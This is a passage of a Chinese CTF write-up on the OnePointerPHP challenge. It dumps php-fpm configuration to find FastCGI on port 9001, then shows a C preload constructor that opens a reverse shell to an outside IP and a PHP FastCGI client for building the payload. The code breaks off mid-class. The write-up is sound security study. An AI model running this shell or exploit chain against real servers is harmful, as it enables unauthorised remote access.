<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> string(5346) &quot;;;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; FPM Configuration ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">; All relative paths in this configuration file are relative to PHP&#x27;s install</span><br><span class="line">; prefix (/usr/local). This prefix can be dynamically changed by using the</span><br><span class="line">; &#x27;-p&#x27; argument from the command line.</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Global Options ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">; Pid file</span><br><span class="line">; Note: the default prefix is /usr/local/var</span><br><span class="line">; Default Value: none</span><br><span class="line">;pid = run/php-fpm.pid</span><br><span class="line"></span><br><span class="line">; Error log file</span><br><span class="line">; If it&#x27;s set to &quot;syslog&quot;, log is sent to syslogd instead of being written</span><br><span class="line">; into a local file.</span><br><span class="line">; Note: the default prefix is /usr/local/var</span><br><span class="line">; Default Value: log/php-fpm.log</span><br><span class="line">;error_log = log/php-fpm.log</span><br><span class="line"></span><br><span class="line">; syslog_facility is used to specify what type of program is logging the</span><br><span class="line">; message. This lets syslogd specify that messages from different facilities</span><br><span class="line">; will be handled differently.</span><br><span class="line">; See syslog(3) for possible values (ex daemon equiv LOG_DAEMON)</span><br><span class="line">; Default Value: daemon</span><br><span class="line">;syslog.facility = daemon</span><br><span class="line"></span><br><span class="line">; syslog_ident is prepended to every message. If you have multiple FPM</span><br><span class="line">; instances running on the same server, you can change the default value</span><br><span class="line">; which must suit common needs.</span><br><span class="line">; Default Value: php-fpm</span><br><span class="line">;syslog.ident = php-fpm</span><br><span class="line"></span><br><span class="line">; Log level</span><br><span class="line">; Possible Values: alert, error, warning, notice, debug</span><br><span class="line">; Default Value: notice</span><br><span class="line">;log_level = notice</span><br><span class="line"></span><br><span class="line">; Log limit on number of characters in the single line (log entry). If the</span><br><span class="line">; line is over the limit, it is wrapped on multiple lines. The limit is for</span><br><span class="line">; all logged characters including message prefix and suffix if present. However</span><br><span class="line">; the new line character does not count into it as it is present only when</span><br><span class="line">; logging to a file descriptor. It means the new line character is not present</span><br><span class="line">; when logging to syslog.</span><br><span class="line">; Default Value: 1024</span><br><span class="line">;log_limit = 4096</span><br><span class="line"></span><br><span class="line">; Log buffering specifies if the log line is buffered which means that the</span><br><span class="line">; line is written in a single write operation. If the value is false, then the</span><br><span class="line">; data is written directly into the file descriptor. It is an experimental</span><br><span class="line">; option that can potentionaly improve logging performance and memory usage</span><br><span class="line">; for some heavy logging scenarios. This option is ignored if logging to syslog</span><br><span class="line">; as it has to be always buffered.</span><br><span class="line">; Default value: yes</span><br><span class="line">;log_buffering = no</span><br><span class="line"></span><br><span class="line">; If this number of child processes exit with SIGSEGV or SIGBUS within the time</span><br><span class="line">; interval set by emergency_restart_interval then FPM will restart. A value</span><br><span class="line">; of &#x27;0&#x27; means &#x27;Off&#x27;.</span><br><span class="line">; Default Value: 0</span><br><span class="line">;emergency_restart_threshold = 0</span><br><span class="line"></span><br><span class="line">; Interval of time used by emergency_restart_interval to determine when</span><br><span class="line">; a graceful restart will be initiated.  This can be useful to work around</span><br><span class="line">; accidental corruptions in an accelerator&#x27;s shared memory.</span><br><span class="line">; Available Units: s(econds), m(inutes), h(ours), or d(ays)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default Value: 0</span><br><span class="line">;emergency_restart_interval = 0</span><br><span class="line"></span><br><span class="line">; Time limit for child processes to wait for a reaction on signals from master.</span><br><span class="line">; Available units: s(econds), m(inutes), h(ours), or d(ays)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default Value: 0</span><br><span class="line">;process_control_timeout = 0</span><br><span class="line"></span><br><span class="line">; The maximum number of processes FPM will fork. This has been designed to control</span><br><span class="line">; the global number of processes when using dynamic PM within a lot of pools.</span><br><span class="line">; Use it with caution.</span><br><span class="line">; Note: A value of 0 indicates no limit</span><br><span class="line">; Default Value: 0</span><br><span class="line">; process.max = 128</span><br><span class="line"></span><br><span class="line">; Specify the nice(2) priority to apply to the master process (only if set)</span><br><span class="line">; The value can vary from -19 (highest priority) to 20 (lowest priority)</span><br><span class="line">; Note: - It will only work if the FPM master process is launched as root</span><br><span class="line">;       - The pool process will inherit the master process priority</span><br><span class="line">;         unless specified otherwise</span><br><span class="line">; Default Value: no set</span><br><span class="line">; process.priority = -19</span><br><span class="line"></span><br><span class="line">; Send FPM to background. Set to &#x27;no&#x27; to keep FPM in foreground for debugging.</span><br><span class="line">; Default Value: yes</span><br><span class="line">;daemonize = yes</span><br><span class="line"></span><br><span class="line">; Set open file descriptor rlimit for the master process.</span><br><span class="line">; Default Value: system defined value</span><br><span class="line">;rlimit_files = 1024</span><br><span class="line"></span><br><span class="line">; Set max core size rlimit for the master process.</span><br><span class="line">; Possible Values: &#x27;unlimited&#x27; or an integer greater or equal to 0</span><br><span class="line">; Default Value: system defined value</span><br><span class="line">;rlimit_core = 0</span><br><span class="line"></span><br><span class="line">; Specify the event mechanism FPM will use. The following is available:</span><br><span class="line">; - select     (any POSIX os)</span><br><span class="line">; - poll       (any POSIX os)</span><br><span class="line">; - epoll      (linux &gt;= 2.5.44)</span><br><span class="line">; - kqueue     (FreeBSD &gt;= 4.1, OpenBSD &gt;= 2.9, NetBSD &gt;= 2.0)</span><br><span class="line">; - /dev/poll  (Solaris &gt;= 7)</span><br><span class="line">; - port       (Solaris &gt;= 10)</span><br><span class="line">; Default Value: not set (auto detection)</span><br><span class="line">;events.mechanism = epoll</span><br><span class="line"></span><br><span class="line">; When FPM is built with systemd integration, specify the interval,</span><br><span class="line">; in seconds, between health report notification to systemd.</span><br><span class="line">; Set to 0 to disable.</span><br><span class="line">; Available Units: s(econds), m(inutes), h(ours)</span><br><span class="line">; Default Unit: seconds</span><br><span class="line">; Default value: 10</span><br><span class="line">;systemd_interval = 10</span><br><span class="line"></span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line">; Pool Definitions ;</span><br><span class="line">;;;;;;;;;;;;;;;;;;;;</span><br><span class="line"></span><br><span class="line">; Multiple pools of child processes may be started with different listening</span><br><span class="line">; ports and different management options.  The name of the pool will be</span><br><span class="line">; used in logs and stats. There is no limitation on the number of pools which</span><br><span class="line">; FPM can handle. Your system will tell you anyway :)</span><br><span class="line"></span><br><span class="line">; Include one or more files. If glob(3) exists, it is used to include a bunch of</span><br><span class="line">; files from a glob(3) pattern. This directive can be used everywhere in the</span><br><span class="line">; file.</span><br><span class="line">; Relative path can also be used. They will be prefixed by:</span><br><span class="line">;  - the global prefix if it&#x27;s been set (-p argument)</span><br><span class="line">;  - /usr/local otherwise</span><br><span class="line">include=etc/php-fpm.d/*.conf</span><br><span class="line">&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现并没有我们需要的东西。。没有找到端口，但是它包含了另外一个conf，我们再去扫一哈</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include&#x3D;etc&#x2F;php-fpm.d&#x2F;*.conf</span><br></pre></td></tr></table></figure>

<p><img src="OnePointerPHP/image-20210512173236764.png" alt="image-20210512173236764"></p>
<p>草，傻了,百度的时候说是用<a href="http://www.conf的,结果我当时路径写错了,,/">www.conf的，结果我当时路径写错了，，</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&#x3D;var_dump(scandir(&#39;&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php-fpm.d&#39;));</span><br></pre></td></tr></table></figure>

<p>这样扫目录的话也能得到</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">group = www-data</span><br><span class="line"></span><br><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &#x27;ip.add.re.ss:port&#x27;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#x27;[ip:6:addr:ess]:port&#x27; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#x27;port&#x27;                 - to listen on a TCP socket to all addresses</span><br><span class="line">;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &#x27;/path/to/unix/socket&#x27; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen = 127.0.0.1:9001</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>发现把端口开在了9001</p>
<p>再之后，噔噔咚，需要利用该操作提权，这里完全不懂就只能跟着复现了，只能说P牛太强啦</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;gist.github.com&#x2F;phith0n&#x2F;9615e2420f31048f7e30f3937356cf75 EXP地址</span><br><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;penetration&#x2F;fastcgi-and-php-fpm.html P牛的讲解</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="https://www.leavesongs.com/penetration/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 (Author: phithon)</a></li>
</ul>
<p>拓展：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/47.97.123.81/11451 0&gt;&amp;1&#x27;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>生成payload的：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_sock = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_host = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_port = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> $_keepAlive = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$host, $port = <span class="number">9001</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = $host;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = $port;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params">$b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)$b;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, $errno, $errstr, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params">$type, $content, $requestId = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $clen = strlen($content);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr($type)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr(($requestId &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr($requestId &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr(($clen &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr($clen &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . $content;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params">$name, $value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $nlen = strlen($name);</span><br><span class="line">        $vlen = strlen($value);</span><br><span class="line">        <span class="keyword">if</span> ($nlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr($nlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            $nvpair = chr(($nlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($nlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($nlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($nlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($vlen &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr($vlen);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span></span><br><span class="line">            $nvpair .= chr(($vlen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) . chr(($vlen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) . chr(($vlen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) . chr($vlen &amp; <span class="number">0xFF</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* nameData &amp; valueData */</span></span><br><span class="line">        <span class="keyword">return</span> $nvpair . $name . $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a set of FastCGI Name value pairs</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data Data containing the set of FastCGI NVPair</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array of NVPair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNvpair</span>(<span class="params">$data, $length = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $array = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> ($length === <span class="literal">null</span>) &#123;</span><br><span class="line">            $length = strlen($data);</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ($p != $length) &#123;</span><br><span class="line">            $nlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($nlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $nlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $nlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $vlen = ord($data&#123;$p++&#125;);</span><br><span class="line">            <span class="keyword">if</span> ($vlen &gt;= <span class="number">128</span>) &#123;</span><br><span class="line">                $vlen = ($nlen &amp; <span class="number">0x7F</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;) &lt;&lt; <span class="number">8</span>);</span><br><span class="line">                $vlen |= (ord($data&#123;$p++&#125;));</span><br><span class="line">            &#125;</span><br><span class="line">            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);</span><br><span class="line">            $p += ($nlen + $vlen);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $array;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Decode a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $data String containing all the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">decodePacketHeader</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ret = <span class="keyword">array</span>();</span><br><span class="line">        $ret[<span class="string">&#x27;version&#x27;</span>]       = ord($data&#123;<span class="number">0</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;type&#x27;</span>]          = ord($data&#123;<span class="number">1</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;requestId&#x27;</span>]     = (ord($data&#123;<span class="number">2</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">3</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;contentLength&#x27;</span>] = (ord($data&#123;<span class="number">4</span>&#125;) &lt;&lt; <span class="number">8</span>) + ord($data&#123;<span class="number">5</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;paddingLength&#x27;</span>] = ord($data&#123;<span class="number">6</span>&#125;);</span><br><span class="line">        $ret[<span class="string">&#x27;reserved&#x27;</span>]      = ord($data&#123;<span class="number">7</span>&#125;);</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Read a FastCGI Packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readPacket</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($packet = fread(<span class="keyword">$this</span>-&gt;_sock, <span class="built_in">self</span>::HEADER_LEN)) &#123;</span><br><span class="line">            $resp = <span class="keyword">$this</span>-&gt;decodePacketHeader($packet);</span><br><span class="line">            $resp[<span class="string">&#x27;content&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;contentLength&#x27;</span>]) &#123;</span><br><span class="line">                $len  = $resp[<span class="string">&#x27;contentLength&#x27;</span>];</span><br><span class="line">                <span class="keyword">while</span> ($len &amp;&amp; $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $len)) &#123;</span><br><span class="line">                    $len -= strlen($buf);</span><br><span class="line">                    $resp[<span class="string">&#x27;content&#x27;</span>] .= $buf;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($resp[<span class="string">&#x27;paddingLength&#x27;</span>]) &#123;</span><br><span class="line">                $buf=fread(<span class="keyword">$this</span>-&gt;_sock, $resp[<span class="string">&#x27;paddingLength&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> $resp;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get Informations on the FastCGI application</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> array $requestedInfo information to retrieve</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getValues</span>(<span class="params"><span class="keyword">array</span> $requestedInfo</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;connect();</span><br><span class="line">        $request = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> ($requestedInfo <span class="keyword">as</span> $info) &#123;</span><br><span class="line">            $request .= <span class="keyword">$this</span>-&gt;buildNvpair($info, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        fwrite(<span class="keyword">$this</span>-&gt;_sock, <span class="keyword">$this</span>-&gt;buildPacket(<span 